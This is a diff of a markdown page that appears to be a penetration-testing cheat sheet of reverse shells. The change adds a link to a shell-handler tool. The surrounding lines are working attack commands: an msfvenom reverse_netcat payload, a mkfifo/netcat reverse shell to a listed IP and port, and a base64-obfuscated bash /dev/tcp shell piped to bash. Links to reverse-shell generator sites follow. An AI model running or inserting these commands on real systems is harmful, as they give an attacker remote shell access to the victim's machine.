@@ -71,6 +71,8 @@ msfvenom -p cmd/unix/reverse_netcat lhost=10.10.10.10 lport=8888 R
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.85.242 9001 >/tmp/f
 echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS45OS4xNDEvODg4OCAwPiYx | base64 -d | bash # 10.11.99.141 8888
 ```
+[penelope](https://github.com/brightio/penelope)
+
 [Other_Reverse_Shell_Site](https://tex2e.github.io/reverse-shell-generator/index.html)
 
 [Pentestmonkey-Reverse-Shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
